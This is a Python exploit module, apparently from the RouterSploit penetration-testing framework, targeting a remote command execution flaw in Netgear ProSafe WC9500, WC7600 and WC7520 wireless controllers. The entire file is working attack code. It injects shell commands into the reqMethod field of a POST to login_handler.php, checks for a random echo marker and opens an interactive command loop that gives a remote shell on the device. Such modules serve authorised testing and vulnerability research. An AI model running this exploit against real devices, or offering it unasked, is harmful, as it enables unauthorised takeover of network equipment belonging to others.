import re

from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Netgear ProSafe WC9500, WC7600, WC7520 remote command execution vulnerability.
    If the target is vulnerable command shell is invoked.
    """
    __info__ = {
        'name': 'Netgear ProSafe RCE',
        'description': 'Module exploits remote command execution vulnerability in Netgear ProSafe'
                       'WC9500, WC7600, WC7520 devices. If the target is vulnerable command shell is invoked.',
        'authors': [
            'Andrei Costin <andrei[at]firmware.re>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://firmware.re/vulns/acsa-2015-002.php',
            'https://www.blackhat.com/docs/asia-16/materials/asia-16-Costin-Automated-Dynamic-Firmware-Analysis-At-Scale-A-Case-Study-On-Embedded-Web-Interfaces.pdf',
        ],
        'devices': [
            'Netgear ProSafe WC9500',
            'Netgear ProSafe WC7600',
            'Netgear ProSafe WC7520',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        mark = random_text(32)
        url = "{}:{}/login_handler.php".format(self.target, self.port)
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
        data = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData";{}; echo {}'.format(cmd, mark)

        response = http_request(method="POST", url=url, headers=headers, data=data)
        if response is None:
            return ""

        if mark in response.text:
            regexp = "(|.+?){}".format(mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
